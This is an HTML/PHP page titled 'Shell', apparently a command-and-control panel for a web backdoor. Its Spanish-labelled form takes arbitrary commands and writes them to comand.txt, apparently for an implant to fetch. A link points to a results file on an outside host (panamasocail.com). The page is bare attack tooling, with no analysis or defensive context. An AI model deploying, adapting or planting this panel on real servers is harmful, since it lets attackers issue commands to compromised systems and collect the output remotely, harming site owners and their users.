<!html>
<head>
<title>Shell</title>
<style>
body {
    background-color: #f0f0f0;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 12px;
    color: #000;
}
form {
    margin: 0 auto;
    width: 300px;
    padding: 10px;
    border: 1px solid #ccc;
    background-color: #fff;
}
input {
    padding: 5px;
    border: 1px solid #ccc;
    width: 100%;
}
* {
    margin: 0;
    padding: 0;
}
h2 {
    margin: 0;
    padding: 0;
    text-align: center;
}
a {
    color: blue;
    text-decoration: none;
}
a img {
    border: 0;
}
a {
    text-aling: center;
}
</style>
</head>
<body>
<form method="post">
<h2>Ponga comandos</h2>
<input type="text" name="cmd" required  />
<input type="submit" value="Execute" />
</form>
<a href="http://panamasocail.com/exe/back/recibe.txt">Ver Resultados</a>
<?php
if(isset($_POST['cmd'])){
    $file = fopen("comand.txt", "w+");
    fwrite($file, $_POST['cmd']);
    fclose($file);
}
?>